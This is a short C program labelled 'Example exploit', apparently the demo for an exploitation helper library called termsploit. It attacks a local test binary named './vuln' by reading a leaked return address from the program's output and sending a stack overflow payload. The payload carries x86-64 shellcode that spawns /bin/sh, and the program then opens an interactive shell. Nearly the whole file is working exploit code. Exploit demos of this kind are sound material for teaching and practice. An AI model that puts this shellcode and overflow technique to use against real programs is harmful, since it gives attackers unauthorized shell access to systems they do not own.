/* Example exploit */
#include <stdio.h>
#include <stdlib.h>
#include <stdint.h>
#include <signal.h>
#include <string.h>
#include "../termsploit.h"

static char shellcode[] = \
	"\x48\x31\xf6\x56\x48\xbf\x2f\x62\x69\x6e\x2f\x2f\x73\x68\x57\x54\x5f\x6a\x3b\x58\x99\x0f\x05";

int main()
{
	termsploit_ctx *ctx;
	char buf[4096];
	char *p;
	intptr_t retaddr;
	int exitcode;

	ctx = termsploit_spawn((char *[]) { "./vuln", NULL });
	if (!ctx) {
		perror("spawn");
		return 1;
	}

	/* Get return address */
	termsploit_read(ctx, buf, sizeof(buf));
	p = strstr(buf, "0x");
	if (!p)
		return 1;
	retaddr = strtoll(p + 2, NULL, 16);

	/* Prepare payload */
	memset(buf, '\xcc', sizeof(buf));
	memcpy(buf, shellcode, strlen(shellcode));
	memcpy(buf + 0x28, &retaddr, 8);
	/* Do exploit */
	termsploit_write(ctx, buf, 100);
	termsploit_write(ctx, "\n", 1);

	/* Got a shell?! */
	termsploit_interactive(ctx);

	exitcode = termsploit_wait(ctx);
	printf("Process exited with %d\n", exitcode);

	termsploit_free(ctx);
	return 0;
}
